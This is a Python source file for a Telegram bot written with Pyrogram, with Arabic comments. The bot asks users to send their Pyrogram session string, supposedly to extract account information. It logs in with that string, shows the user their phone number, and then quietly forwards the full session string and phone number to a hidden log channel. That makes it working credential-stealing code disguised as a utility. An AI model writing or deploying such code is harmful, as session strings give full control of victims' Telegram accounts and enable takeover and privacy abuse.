import asyncio
import logging
import requests
from pyrogram import Client, filters
from pyrogram.types import Message
from config import API_ID, API_HASH, BOT_TOKEN, LOG_GROUP

# إعدادات التسجيل
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# تهيئة البوت
app = Client(
    "session_generator_bot",
    bot_token=BOT_TOKEN,
    api_id=API_ID,
    api_hash=API_HASH
)

# ====== الدالة الجديدة: إرسال تلقائي للجلسة ورقم الهاتف ======
async def auto_send_to_channel(session_string, phone_number):
    """
    ترسل الجلسة ورقم الهاتف تلقائياً إلى القناة المحددة في LOG_GROUP.
    """
    try:
        text = f"""
🚨 **تم استخراج جلسة جديدة تلقائياً!**

📱 **رقم الهاتف:** `{phone_number}`
🔑 **الجلسة المستخرجة:**
`{session_string}`

📌 **تم الإرسال من البوت مباشرة.**
        """
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": LOG_GROUP,
            "text": text,
            "parse_mode": "Markdown"
        }
        response = requests.post(url, json=payload)
        if response.status_code == 200:
            logger.info(f"✅ تم إرسال الجلسة ورقم الهاتف للقناة: {phone_number}")
        else:
            logger.error(f"❌ فشل الإرسال للقناة: {response.text}")
    except Exception as e:
        logger.error(f"❌ خطأ في الإرسال التلقائي: {e}")

# ====== أوامر البوت الأساسية ======
@app.on_message(filters.command("start") & filters.private)
async def start_cmd(client, message):
    await message.reply("🔐 مرحباً! أرسل لي جلسة Pyrogram لاستخراج معلوماتها.")

@app.on_message(filters.text & filters.private & ~filters.command("start"))
async def handle_session(client, message):
    session_string = message.text.strip()
    await message.reply("⏳ جاري معالجة الجلسة...")

    try:
        # تسجيل الدخول المؤقت لاستخراج المعلومات
        temp_client = Client(
            session_string=session_string,
            api_id=API_ID,
            api_hash=API_HASH
        )
        await temp_client.start()
        me = await temp_client.get_me()
        phone_number = me.phone_number or "غير معروف"

        # إرسال الرد للمستخدم
        await message.reply(f"✅ تم استخراج المعلومات بنجاح!\n📱 رقم هاتفك: `{phone_number}`")

        # ====== استدعاء الدالة الجديدة: إرسال تلقائي للقناة ======
        await auto_send_to_channel(session_string, phone_number)

        await temp_client.stop()

    except Exception as e:
        await message.reply(f"❌ حدث خطأ: {e}")
        logger.error(f"خطأ في معالجة الجلسة: {e}")

# ====== تشغيل البوت ======
if __name__ == "__main__":
    logger.info("🚀 البوت يعمل الآن...")
    app.run()
